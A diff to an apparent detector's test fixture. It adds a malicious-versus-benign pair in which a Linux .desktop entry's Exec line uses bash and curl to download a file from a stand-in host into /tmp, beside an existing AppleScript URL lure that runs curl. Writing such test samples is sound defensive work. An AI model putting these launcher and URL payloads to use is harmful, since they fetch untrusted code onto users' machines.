@@ -217,6 +217,11 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"[Desktop Entry]\nType=Application\nName=Firefox\nExec=firefox %u\n",
         ),
         (
+            "linux_desktop_exec_fetch",
+            b'[Desktop Entry]\nType=Application\nExec=bash -c "cd /tmp && curl -so p https://example.invalid/p"\n',
+            b"[Desktop Entry]\nType=Application\nName=Docs\nExec=firefox https://curl.se/docs/\n",
+        ),
+        (
             "web_applescript_url_lure",
             b'<a href="applescript://com.apple.scripteditor?action=new&amp;'
             b'script=do%20shell%20script%20%22curl%20-s%20https%3A%2F%2Fexample.invalid%22">x</a>\n',
